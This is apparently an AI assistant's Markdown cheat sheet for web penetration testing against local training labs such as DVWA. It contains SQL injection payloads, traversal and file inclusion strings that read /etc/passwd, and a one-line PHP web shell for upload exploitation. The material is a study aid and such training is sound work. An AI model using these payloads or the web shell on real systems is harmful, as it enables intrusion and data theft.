Certainly, I'll create a document explaining each term and command from the content you've shared, along with a step-by-step breakdown of the procedures.

Let me get this file ready for you.

Here's a comprehensive Markdown document that includes detailed explanations of each command, term, and procedure. You can save this as `Network_and_Security_Cheat_Sheet.md` for easy access on GitHub or other Markdown-compatible platforms.

```markdown
# Network and Security Cheat Sheet

This document provides an overview of essential network commands, security testing techniques, and terminology useful for penetration testing and ethical hacking.

---

## Host Lookup

- **`host google.com`**  
  - The `host` command retrieves the IP address and related information for a domain name like `google.com`. It’s useful for DNS lookups.

---

## Website Enumeration

### Key Commands

- **`nslookup google.com`**  
  - Displays DNS information, such as server address and name, for the given domain.

- **`whois google.com`**  
  - Retrieves registration data for a domain, including the registrant, registrar, and expiration date. Useful for OSINT.

- **`whatweb <ip-address>`**  
  - Scans for various details about a web server, such as software versions and frameworks.

- **`whatweb --aggression 3 -v <ip-address>`**  
  - Runs a more aggressive scan for comprehensive details on a specified IP address.

- **`whatweb --aggression 3 -v <ip-range> --no-errors`**  
  - Scans a range of IPs aggressively without showing errors. Ideal for broad network scans.

---

### Finding Hidden Directories

To discover hidden files or directories on a web server, use:

- **`dirb <address>`**  
  - Scans the address to uncover hidden directories using default wordlists.
  
- **Example with custom wordlist**:
  ```sh
  dirb http://<ip-address> /usr/share/wordlists/dirb/common.txt
  ```

- **`nmap -sV <ip-address>`**  
  - Nmap (`-sV` flag) discovers open ports and fetches service versions for a given IP.

- **`nikto -host <ip-address>`**  
  - Scans the host for vulnerabilities, such as outdated software, misconfigurations, and more.
  - **Specific Port Example**:
    ```sh
    nikto -host <ip-address> -port 8081
    ```

---

## 1. Broken Access Control

**Broken Access Control** occurs when an attacker can bypass authorization mechanisms to access restricted resources or perform unauthorized actions.

```sh
sudo docker container ps
```
This command lists active Docker containers on the system, which can be relevant if inspecting containers for misconfigurations.

---

### SQL Injection Example

SQL Injection is a vulnerability that allows attackers to execute arbitrary SQL commands. Common payloads include:

- **Basic Payload**:
  ```sql
  ' OR 1=1 #
  ```
  - Executes a true condition (1=1) to bypass login or other input-based restrictions.

- **Extracting Passwords**:
  ```sql
  ' UNION SELECT user, password FROM users #
  ```
  - Uses `UNION` to combine results from multiple tables, potentially exposing sensitive data.

#### DVWA SQL Injection Examples:

- **Low Security**:
  ```sql
  test' OR 1=1 --
  ```
  - Payload used in URL or form input to bypass low-level protections.
  
- **Medium Security**:
  ```sql
  1 OR 1=1 #
  ```
  - Adjusted for slightly more complex scenarios. 
  - Example to extract passwords:
    ```sql
    1 UNION SELECT user, password FROM users #
    ```

**SecureBank SQL Injection**:
For extracting information from `Transactions` tables:
```sql
' UNION SELECT * FROM Transactions --
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions --
```

---

## Directory Traversal

Directory Traversal involves accessing restricted directories by manipulating URL paths to gain unauthorized access to files.

Example setup:
```sh
tar -xvf apache-tomcat-8.5.99.tar.gz
./catalina.sh run
```

### Python Virtual Environment Setup

Setting up a virtual environment isolates Python packages for testing purposes.
```sh
python3 -m venv venv
. venv/bin/activate
```

#### **`wfuzz`** Usage:

- **Basic fuzzing**:
  ```sh
  wfuzz -w <wordlist> http://localhost:1337/dynamic-app1/?FUZZ=test
  ```
  - `wfuzz` is used here to try multiple paths/parameters by fuzzing.

- **Accessing a Secret File**:
  ```sh
  http://localhost:1337/dynamic-app1/?file=../../../secret.txt
  ```
  - Exploiting traversal to access restricted files by moving up directories.

---

## 2. File Inclusion Vulnerabilities

File Inclusion occurs when an attacker can influence the file that a server processes, potentially exposing server files or code.

### Examples

- **Basic Inclusion**:
  ```sh
  /app?page=main&username=<username>
  ```

#### Local File Inclusion (LFI)

LFI allows attackers to read files on the server, potentially exposing sensitive data.

- **Low Security LFI**:
  ```sh
  http://localhost/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
  ```

- **Medium Security LFI**:
  ```sh
  http://localhost/vulnerabilities/fi/?page=....//....//....//etc/passwd
  ```

- **Hard Security LFI**:
  ```sh
  http://localhost/vulnerabilities/fi/?page=file4.php../../../../etc/passwd
  ```

#### PHP Filter Bypass
- **Using Base64 Encoding**:
  ```sh
  http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
  ```
  - Encodes file contents as base64 to bypass restrictions.

---

## 3. File Upload Vulnerabilities

File Upload vulnerabilities allow attackers to upload malicious files to the server, potentially enabling remote code execution.

### Basic File Server Setup
```sh
cd <www-directory>
php -S 127.0.0.1:7070
touch hello.php
echo "<?php echo 'hello world'; ?>" > hello.php
```

- **Basic Exploit Example**:
  - Upload a file named `shell.php` containing:
    ```php
    <?php system($_REQUEST['cmd']); ?>
    ```
  - Access it through:
    ```sh
    http://localhost:7070/uploads/level1-thumbnail.php?cmd=whoami
    ```

---

### Terminology

1. **Host Lookup**:
   - Refers to identifying IP addresses or DNS records associated with a domain name.

2. **Directory Traversal**:
   - A method where attackers access files by navigating directories without authorization.

3. **SQL Injection**:
   - Exploiting an application’s database query processing to manipulate or retrieve sensitive data.

4. **Local File Inclusion (LFI)**:
   - An attack that allows reading files on the web server.

5. **Remote Code Execution (RCE)**:
   - When an attacker can run code on a target system from a distance.

6. **Fuzzing**:
   - Sending numerous inputs to a program to discover vulnerabilities.

7. **Docker**:
   - A platform for running applications in isolated containers.

8. **Virtual Environment**:
   - Python’s tool for creating isolated package environments.

---

### Important Security Tips
- **Limit Directory Access**: Avoid leaving sensitive directories or files publicly accessible.
- **Sanitize Inputs**: Always validate and sanitize user inputs to prevent SQL Injection and File Inclusion attacks.
- **Use Strong Authentication**: Ensure proper access controls are in place to limit broken access control risks.
- **Regularly Update and Patch**: Keep software up-to-date to prevent exploitation of known vulnerabilities.

---

Use this guide responsibly to understand and practice network and security commands ethically!
```

---

This document is formatted for clarity and includes explanations for each term. Let me know if you'd like additional detail on any part!
